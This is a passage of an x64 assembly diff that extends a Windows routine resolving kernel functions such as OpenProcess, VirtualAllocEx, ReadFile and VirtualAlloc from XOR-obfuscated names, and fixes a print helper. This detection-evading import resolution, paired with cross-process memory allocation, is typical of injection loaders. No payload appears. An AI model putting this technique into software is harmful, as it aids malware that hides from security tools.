@@ -1102,6 +1102,22 @@ populate_kernel_function_ptrs_by_name:
     mov [get_std_handle], rax                   ; GetStdHandle addr
 
     mov rcx, [rbp + 16]
+    mov rdx, open_file_xor
+    mov r8, open_file_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [open_file], rax                        ; OpenFile addr
+ 
+    mov rcx, [rbp + 16]
+    mov rdx, get_file_size_xor
+    mov r8, get_file_size_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_file_size], rax                    ; GetFileSize addr
+ 
+    mov rcx, [rbp + 16]
     mov rdx, open_process_xor
     mov r8, open_process_xor.len
     xor r9, r9
@@ -1115,7 +1131,15 @@ populate_kernel_function_ptrs_by_name:
     xor r9, r9
     call unxor_and_get_proc_addr                ; proc addr
 
-    mov [create_file_a], rax                      ; CreateFileA addr
+    mov [create_file_a], rax                    ; CreateFileA addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, read_file_xor
+    mov r8, read_file_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [read_file], rax                        ; ReadFile addr
 
     mov rcx, [rbp + 16]
     mov rdx, write_file_xor
@@ -1126,12 +1150,28 @@ populate_kernel_function_ptrs_by_name:
     mov [write_file], rax                       ; WriteFile addr
 
     mov rcx, [rbp + 16]
+    mov rdx, virtual_alloc_xor
+    mov r8, virtual_alloc_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_alloc], rax                    ; VirtualAlloc addr
+
+    mov rcx, [rbp + 16]
     mov rdx, virtual_alloc_ex_xor
     mov r8, virtual_alloc_ex_xor.len
     xor r9, r9
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [virtual_alloc_ex], rax                 ; VirtualAllocEx addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, virtual_free_xor
+    mov r8, virtual_free_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_free], rax                     ; VirtualFree addr
 
     mov rcx, [rbp + 16]
     mov rdx, virtual_free_ex_xor
@@ -1515,10 +1555,11 @@ print_string:
 
     mov qword [rbp - 8], 0                  ; return value
 
-    mov rcx, [rbp - 8]                      ; std handle
-    mov rdx, [rbp + 16]                     ; ptr to str
-    mov r8, [rbp + 24]                      ; str len
+    mov rcx, [rbp + 16]                     ; std handle
+    mov rdx, [rbp + 24]                     ; ptr to str
+    mov r8, [rbp + 32]                      ; str len
     xor r9, r9
+    mov qword [rsp + 32], 0
     call [write_file]
 
 .shutdown:
